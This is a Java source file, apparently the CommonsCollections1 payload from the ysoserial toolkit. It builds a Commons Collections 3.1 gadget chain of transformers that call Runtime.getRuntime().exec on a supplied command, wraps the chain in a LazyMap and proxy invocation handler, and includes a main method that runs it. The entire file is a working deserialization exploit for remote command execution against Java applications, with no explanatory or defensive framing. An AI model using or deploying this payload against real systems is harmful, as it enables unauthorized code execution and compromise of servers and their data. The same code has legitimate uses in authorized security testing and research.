@java.lang.SuppressWarnings({ "rawtypes", "unchecked" })
@ysoserial.payloads.annotation.Dependencies({ "commons-collections:commons-collections:3.1" })
public class CommonsCollections1 extends ysoserial.payloads.util.PayloadRunner implements ysoserial.payloads.ObjectPayload<java.lang.reflect.InvocationHandler> {
	public java.lang.reflect.InvocationHandler getObject(final java.lang.String command) throws java.lang.Exception {
		final java.lang.String[] execArgs = new java.lang.String[]{ command };
		final org.apache.commons.collections.Transformer transformerChain = new org.apache.commons.collections.functors.ChainedTransformer(new org.apache.commons.collections.Transformer[]{ new org.apache.commons.collections.functors.ConstantTransformer(1) });
		final org.apache.commons.collections.Transformer[] transformers = new org.apache.commons.collections.Transformer[]{ new org.apache.commons.collections.functors.ConstantTransformer(java.lang.Runtime.class), new org.apache.commons.collections.functors.InvokerTransformer("getMethod", new java.lang.Class[]{ java.lang.String.class, java.lang.Class[].class }, new java.lang.Object[]{ "getRuntime", new java.lang.Class[0] }), new org.apache.commons.collections.functors.InvokerTransformer("invoke", new java.lang.Class[]{ java.lang.Object.class, java.lang.Object[].class }, new java.lang.Object[]{ null, new java.lang.Object[0] }), new org.apache.commons.collections.functors.InvokerTransformer("exec", new java.lang.Class[]{ java.lang.String.class }, execArgs), new org.apache.commons.collections.functors.ConstantTransformer(1) };
		final java.util.Map innerMap = new java.util.HashMap();
		final java.util.Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, transformerChain);
		final java.util.Map mapProxy = ysoserial.payloads.util.Gadgets.createMemoitizedProxy(lazyMap, java.util.Map.class);
		final java.lang.reflect.InvocationHandler handler = ysoserial.payloads.util.Gadgets.createMemoizedInvocationHandler(mapProxy);
		ysoserial.payloads.util.Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
		return handler;
	}

	public static void main(final java.lang.String[] args) throws java.lang.Exception {
		ysoserial.payloads.util.PayloadRunner.run(ysoserial.payloads.CommonsCollections1.class, args);
	}
}